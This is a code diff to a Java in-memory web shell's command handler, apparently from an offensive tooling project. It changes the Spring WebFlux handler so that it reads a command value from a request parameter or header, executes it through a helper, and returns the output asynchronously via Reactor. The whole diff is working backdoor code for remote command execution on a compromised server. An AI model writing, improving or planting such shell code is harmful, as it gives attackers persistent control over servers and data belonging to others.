@@ -2,6 +2,8 @@ package com.reajason.javaweb.memshell.shelltool.command;
 
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.server.ServerWebExchange;
+import reactor.core.publisher.Mono;
+import reactor.core.scheduler.Schedulers;
 
 import java.io.InputStream;
 import java.util.Scanner;
@@ -18,17 +20,21 @@ public class CommandHandlerMethod {
         if (p == null || p.isEmpty()) {
             p = exchange.getRequest().getHeaders().getFirst(paramName);
         }
-        String result = "";
-        try {
-            if (p != null) {
-                String param = getParam(p);
-                InputStream inputStream = getInputStream(param);
-                result = new Scanner(inputStream).useDelimiter("\\A").next();
+        final String paramValue = p;
+        Mono<String> resultMono = Mono.fromCallable(() -> {
+            String result = "";
+            try {
+                if (paramValue != null) {
+                    String param = getParam(paramValue);
+                    InputStream inputStream = getInputStream(param);
+                    result = new Scanner(inputStream).useDelimiter("\\A").next();
+                }
+            } catch (Throwable e) {
+                e.printStackTrace();
             }
-        } catch (Throwable e) {
-            e.printStackTrace();
-        }
-        return ResponseEntity.ok(result);
+            return result;
+        }).subscribeOn(Schedulers.boundedElastic());
+        return ResponseEntity.ok(resultMono);
     }
 
     private String getParam(String param) {
